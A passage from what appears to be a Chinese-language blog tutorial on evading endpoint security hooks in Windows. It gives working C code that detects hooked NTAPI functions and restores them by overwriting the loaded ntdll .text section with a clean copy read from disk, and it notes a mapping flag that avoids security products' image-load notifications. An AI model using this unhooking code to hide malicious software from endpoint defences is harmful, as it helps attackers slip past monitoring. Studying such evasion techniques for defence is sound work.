</span></span><span style="display:flex;"><span> PIMAGE_DOS_HEADER pImgDosHdr <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)pBase;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pImgDosHdr<span style="color:#f92672">-&gt;</span>e_magic <span style="color:#f92672">!=</span> IMAGE_DOS_SIGNATURE)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span> PIMAGE_NT_HEADERS pImgNtHdrs <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)(pBase <span style="color:#f92672">+</span> pImgDosHdr<span style="color:#f92672">-&gt;</span>e_lfanew);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pImgNtHdrs<span style="color:#f92672">-&gt;</span>Signature <span style="color:#f92672">!=</span> IMAGE_NT_SIGNATURE)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> IMAGE_OPTIONAL_HEADER ImgOptHdr <span style="color:#f92672">=</span> pImgNtHdrs<span style="color:#f92672">-&gt;</span>OptionalHeader;
</span></span><span style="display:flex;"><span> PIMAGE_EXPORT_DIRECTORY pImgExportDir <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)(pBase <span style="color:#f92672">+</span> ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
</span></span><span style="display:flex;"><span> PDWORD FunctionNameArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNames);
</span></span><span style="display:flex;"><span> PDWORD FunctionAddressArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
</span></span><span style="display:flex;"><span> PWORD  FunctionOrdinalArray <span style="color:#f92672">=</span> (PWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> pImgExportDir<span style="color:#f92672">-&gt;</span>NumberOfFunctions; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  CHAR<span style="color:#f92672">*</span> pFunctionName <span style="color:#f92672">=</span> (CHAR<span style="color:#f92672">*</span>)(pBase <span style="color:#f92672">+</span> FunctionNameArray[i]);
</span></span><span style="display:flex;"><span>  PBYTE pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)(pBase <span style="color:#f92672">+</span> FunctionAddressArray[FunctionOrdinalArray[i]]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_stricmp</span>(funcName,pFunctionName)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// Check if the first 4 bytes match 0x4C, 0x8B, 0xD1, and 0xB8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#66d9ef">if</span> (pFunctionAddress[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4C</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8B</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xD1</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xB8</span>)
</span></span><span style="display:flex;"><span>   {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;NTAPI %s may not be hooked</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, funcName);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>   {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;NTAPI %s is hooked</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, funcName);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> HMODULE ntdll;
</span></span><span style="display:flex;"><span> HMODULE kernel32;
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">GetModule</span>(<span style="color:#f92672">&amp;</span>ntdll, <span style="color:#f92672">&amp;</span>kernel32);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;ntdll base address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ntdll);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;kernel32 base address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kernel32);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">CheckFuncByName</span>(ntdll,<span style="color:#e6db74">&#34;NtAllocateVirtualMemory&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">CheckFuncByName</span>(ntdll, <span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">CheckFuncByName</span>(ntdll, <span style="color:#e6db74">&#34;NtReadVirtualMemory&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">CheckFuncByName</span>(ntdll, <span style="color:#e6db74">&#34;NtWriteVirtualMemory&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>编译后，使用 WinDBG 来调试该程序，通过手动修改 NtOpenProcess 的第一条指令来模拟 hook。程序也成功地检测出 NtOpenProcess API 的指令被纂改。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155549.png" alt="20240324155549" /></p>
<h3 id="替换-text-节">
  <strong>替换 .text 节</strong>
  <a class="anchor" href="#%e6%9b%bf%e6%8d%a2-text-%e8%8a%82">#</a>
</h3>
<p>我们知道 PE 文件的 .text 节是可执行代码的区域，权限是 <strong>RX</strong>。既然特定 NTAPI 被 hook 了，只要用干净的 ntdll 的 .text 节来覆盖，那么我们就会得到干净的代码，自然可以实现 unhook。</p>
<p>因此，我们首先要获得载入的 ntdll 模块的地址，这个我们已经用代码实现了。然后我们从磁盘读取 ntdll 文件，并存储在缓冲区中。需要注意的是，存储在缓冲区中的 ntdll 的内容是基于磁盘中的形式，即尚未映射到内存中。这样，我们有了 2 份不同的 ntdll 的地址，一份是<strong>被 hook</strong> 的，一份是<strong>干净</strong>的；一份是<strong>映射在内存中</strong>的，一份是<strong>基于磁盘形式</strong>的。因此，在将干净 ntdll 文件中的 .text 节覆盖被 hook 的 ntdll 的 .text 节时，我们需要稍加注意 PointerOfRawData 与 VirtualAddress，SizeOfRawData 与 VirtualSize。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _IMAGE_SECTION_HEADER {
</span></span><span style="display:flex;"><span>    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">union</span> {
</span></span><span style="display:flex;"><span>            DWORD   PhysicalAddress;
</span></span><span style="display:flex;"><span>            DWORD   VirtualSize;
</span></span><span style="display:flex;"><span>    } Misc;
</span></span><span style="display:flex;"><span>    DWORD   VirtualAddress;
</span></span><span style="display:flex;"><span>    DWORD   SizeOfRawData;
</span></span><span style="display:flex;"><span>    DWORD   PointerToRawData;
</span></span><span style="display:flex;"><span>    DWORD   PointerToRelocations;
</span></span><span style="display:flex;"><span>    DWORD   PointerToLinenumbers;
</span></span><span style="display:flex;"><span>    WORD    NumberOfRelocations;
</span></span><span style="display:flex;"><span>    WORD    NumberOfLinenumbers;
</span></span><span style="display:flex;"><span>    DWORD   Characteristics;
</span></span><span style="display:flex;"><span>} IMAGE_SECTION_HEADER, <span style="color:#f92672">*</span>PIMAGE_SECTION_HEADER;
</span></span></code></pre></div><p>以下面截图中的 ntdll 为例，在本地磁盘时，文件偏移为 0x400，尺寸为 0x11920。当被载入至内存时，RVA 是 0x1000，尺寸为 0x1190ce。我们需要注意到这差异。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155600.png" alt="20240324155600" /></p>
<p>因为两者 .text 节的尺寸有轻微不同，为了保险起见，我们适用尺寸更大的 .text 节来覆盖。之所以考虑这点，我是担心如果干净的 .text 节尺寸更小，那么没有完全覆盖，载入的 ntdll 的代码区还会有少量代码残留，可能在特定情况下导致意想不到的结果。尽管在本案例中干净的代码区尺寸更大，但在其他的操作系统版本可能是相反的情况，所以我们依旧需要考虑到。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">GetModule</span>(HMODULE<span style="color:#f92672">*</span> ntdll, HMODULE<span style="color:#f92672">*</span> kernel32)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PPEB peb <span style="color:#f92672">=</span> (PPEB)(<span style="color:#a6e22e">__readgsqword</span>(<span style="color:#ae81ff">0x60</span>));
</span></span><span style="display:flex;"><span> PPEB_LDR_DATA ldr <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PPEB_LDR_DATA<span style="color:#f92672">*</span>)((PBYTE)peb <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>); <span style="color:#75715e">//PPEB_LDR_DATA pLdr = pPeb-&gt;Ldr;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PLIST_ENTRY ntdlllistentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)ldr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>);
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span>ntdll <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(HMODULE<span style="color:#f92672">*</span>)((PBYTE)ntdlllistentry <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span> PLIST_ENTRY kernelbaselistentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)ntdlllistentry);
</span></span><span style="display:flex;"><span> PLIST_ENTRY kernel32listentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)kernelbaselistentry);
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span>kernel32 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(HMODULE<span style="color:#f92672">*</span>)((PBYTE)kernel32listentry <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">CheckFuncByName</span>(IN HMODULE hModule, <span style="color:#66d9ef">const</span> CHAR<span style="color:#f92672">*</span> funcName)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PBYTE pBase <span style="color:#f92672">=</span> (PBYTE)hModule;
</span></span><span style="display:flex;"><span> PIMAGE_DOS_HEADER pImgDosHdr <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)pBase;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pImgDosHdr<span style="color:#f92672">-&gt;</span>e_magic <span style="color:#f92672">!=</span> IMAGE_DOS_SIGNATURE)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span> PIMAGE_NT_HEADERS pImgNtHdrs <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)(pBase <span style="color:#f92672">+</span> pImgDosHdr<span style="color:#f92672">-&gt;</span>e_lfanew);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pImgNtHdrs<span style="color:#f92672">-&gt;</span>Signature <span style="color:#f92672">!=</span> IMAGE_NT_SIGNATURE)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> IMAGE_OPTIONAL_HEADER ImgOptHdr <span style="color:#f92672">=</span> pImgNtHdrs<span style="color:#f92672">-&gt;</span>OptionalHeader;
</span></span><span style="display:flex;"><span> PIMAGE_EXPORT_DIRECTORY pImgExportDir <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)(pBase <span style="color:#f92672">+</span> ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
</span></span><span style="display:flex;"><span> PDWORD FunctionNameArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNames);
</span></span><span style="display:flex;"><span> PDWORD FunctionAddressArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
</span></span><span style="display:flex;"><span> PWORD  FunctionOrdinalArray <span style="color:#f92672">=</span> (PWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> pImgExportDir<span style="color:#f92672">-&gt;</span>NumberOfFunctions; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  CHAR<span style="color:#f92672">*</span> pFunctionName <span style="color:#f92672">=</span> (CHAR<span style="color:#f92672">*</span>)(pBase <span style="color:#f92672">+</span> FunctionNameArray[i]);
</span></span><span style="display:flex;"><span>  PBYTE pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)(pBase <span style="color:#f92672">+</span> FunctionAddressArray[FunctionOrdinalArray[i]]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_stricmp</span>(funcName, pFunctionName) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// Check if the first 4 bytes match 0x4C, 0x8B, 0xD1, and 0xB8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#66d9ef">if</span> (pFunctionAddress[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4C</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8B</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xD1</span> <span style="color:#f92672">&amp;&amp;</span> pFunctionAddress[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xB8</span>)
</span></span><span style="display:flex;"><span>   {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;NTAPI %s may not be hooked</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, funcName);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>   {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;NTAPI %s is hooked</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, funcName);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> HMODULE ntdll;
</span></span><span style="display:flex;"><span> HMODULE kernel32;
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">GetModule</span>(<span style="color:#f92672">&amp;</span>ntdll, <span style="color:#f92672">&amp;</span>kernel32);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;ntdll base address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ntdll);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;kernel32 base address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kernel32);
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">CheckFuncByName</span>(ntdll, <span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> HANDLE hFile <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">ntdll.dll&#34;</span>, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (hFile <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] CreateFileA Failed With Error : %d </span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> DWORD dwFileLen <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetFileSize</span>(hFile, NULL);
</span></span><span style="display:flex;"><span> DWORD dwNumberOfBytesRead;
</span></span><span style="display:flex;"><span> PVOID pNtdllBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, dwFileLen);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">ReadFile</span>(hFile, pNtdllBuffer, dwFileLen, <span style="color:#f92672">&amp;</span>dwNumberOfBytesRead, NULL) <span style="color:#f92672">||</span> dwFileLen <span style="color:#f92672">!=</span> dwNumberOfBytesRead)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] ReadFile Failed With Error : %d </span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (hFile)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">CloseHandle</span>(hFile);
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> PIMAGE_DOS_HEADER hookedDosHeader <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)ntdll;
</span></span><span style="display:flex;"><span> PIMAGE_NT_HEADERS hookedNtHeader <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdll <span style="color:#f92672">+</span> hookedDosHeader<span style="color:#f92672">-&gt;</span>e_lfanew);
</span></span><span style="display:flex;"><span> PIMAGE_DOS_HEADER CleanDosHeader <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)pNtdllBuffer;
</span></span><span style="display:flex;"><span> PIMAGE_NT_HEADERS CleanNtHeader <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)((DWORD_PTR)pNtdllBuffer <span style="color:#f92672">+</span> CleanDosHeader<span style="color:#f92672">-&gt;</span>e_lfanew);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> (WORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> hookedNtHeader<span style="color:#f92672">-&gt;</span>FileHeader.NumberOfSections; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  PIMAGE_SECTION_HEADER hookedSectionHeader <span style="color:#f92672">=</span> (PIMAGE_SECTION_HEADER)((DWORD_PTR)<span style="color:#a6e22e">IMAGE_FIRST_SECTION</span>(hookedNtHeader) <span style="color:#f92672">+</span> ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER <span style="color:#f92672">*</span> i));
</span></span><span style="display:flex;"><span>  PIMAGE_SECTION_HEADER CleanSectionHeader <span style="color:#f92672">=</span> (PIMAGE_SECTION_HEADER)((DWORD_PTR)<span style="color:#a6e22e">IMAGE_FIRST_SECTION</span>(CleanNtHeader) <span style="color:#f92672">+</span> ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER <span style="color:#f92672">*</span> i));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)hookedSectionHeader<span style="color:#f92672">-&gt;</span>Name, (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#e6db74">&#34;.text&#34;</span>))
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>   LPVOID hookedTextSection <span style="color:#f92672">=</span> (LPVOID)((DWORD_PTR)ntdll <span style="color:#f92672">+</span> (DWORD_PTR)hookedSectionHeader<span style="color:#f92672">-&gt;</span>VirtualAddress);
</span></span><span style="display:flex;"><span>   LPVOID CleanTextSection <span style="color:#f92672">=</span> (LPVOID)((DWORD_PTR)pNtdllBuffer <span style="color:#f92672">+</span> (DWORD_PTR)CleanSectionHeader<span style="color:#f92672">-&gt;</span>PointerToRawData);
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">size_t</span> size_TextSection <span style="color:#f92672">=</span> (hookedSectionHeader<span style="color:#f92672">-&gt;</span>Misc.VirtualSize <span style="color:#f92672">&gt;</span> CleanSectionHeader<span style="color:#f92672">-&gt;</span>SizeOfRawData) <span style="color:#f92672">?</span> hookedSectionHeader<span style="color:#f92672">-&gt;</span>Misc.VirtualSize : CleanSectionHeader<span style="color:#f92672">-&gt;</span>SizeOfRawData;
</span></span><span style="display:flex;"><span>   DWORD oldProtection <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">bool</span> isProtected <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualProtect</span>(hookedTextSection, size_TextSection, PAGE_EXECUTE_READWRITE, <span style="color:#f92672">&amp;</span>oldProtection);
</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">memcpy</span>(hookedTextSection, CleanTextSection, size_TextSection);
</span></span><span style="display:flex;"><span>   isProtected <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualProtect</span>(hookedTextSection, size_TextSection, oldProtection, <span style="color:#f92672">&amp;</span>oldProtection);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">CheckFuncByName</span>(ntdll, <span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>编译后，我们使用 WinDBG 来调试该程序，为了模拟 hook，我们手动修改 NtOpenProcess API 的第一条指令，并且确认了该修改是成功的。在程序运行结束后，查看该 API，发现代码被恢复成原有的了。因此，通过替换 .text 节，我们可以实现对用户态 Hook 的绕过。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155612.png" alt="20240324155612" /></p>
<p>值得一提的是，我发现其他利用此方法的代码里，作者们用了 CreateFileMapping 与 MapViewOfFile 来将干净的 ntdll 载入至内存中。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE <span style="color:#a6e22e">CreateFileMappingA</span>(
</span></span><span style="display:flex;"><span>  [in]           HANDLE                hFile,
</span></span><span style="display:flex;"><span>  [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
</span></span><span style="display:flex;"><span>  [in]           DWORD                 flProtect,
</span></span><span style="display:flex;"><span>  [in]           DWORD                 dwMaximumSizeHigh,
</span></span><span style="display:flex;"><span>  [in]           DWORD                 dwMaximumSizeLow,
</span></span><span style="display:flex;"><span>  [in, optional] LPCSTR                lpName
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">MapViewOfFile</span>(
</span></span><span style="display:flex;"><span>  [in] HANDLE hFileMappingObject,
</span></span><span style="display:flex;"><span>  [in] DWORD  dwDesiredAccess,
</span></span><span style="display:flex;"><span>  [in] DWORD  dwFileOffsetHigh,
</span></span><span style="display:flex;"><span>  [in] DWORD  dwFileOffsetLow,
</span></span><span style="display:flex;"><span>  [in] SIZE_T dwNumberOfBytesToMap
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>使用这些 WinAPI 时，因为映像被映射到内存中，因此 Windows 加载器会适用变更的<strong>对齐系数</strong>，导致 .text 的偏移也不同。如果 CreateFileMappingA 的 flProtext 参数没有包含 <strong>SEC_IMAGE</strong> 或 <strong>SEC_IMAGE_NO_EXECUTE</strong> 标志，则不会适用新的对齐。但SEC_IMAGE_NO_EXECUTE 标志还是会更好一些，因为它不会触发 PsSetLoadImageNotifyRoutine 回调。这意味着当 ntdll.dll 被映射到内存时，使用此标志不会提醒接收<strong>映像载入通知例程</strong>的安全产品。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>hSection <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileMappingA</span>(hFile, NULL, PAGE_READONLY <span style="color:#f92672">|</span> SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (hSection <span style="color:#f92672">==</span> NULL) {
